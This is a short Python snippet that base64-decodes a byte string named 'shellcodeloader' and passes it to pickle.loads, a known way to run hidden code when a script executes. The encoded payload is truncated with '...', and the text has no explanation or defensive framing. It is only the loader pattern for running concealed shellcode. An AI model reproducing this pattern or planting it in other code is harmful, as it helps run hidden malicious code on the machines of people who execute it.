import base64,pickle
import codecs

shellcodeloader = b'gASVjwgAAA...'
pickle.loads(base64.b64decode(shellcodeloader))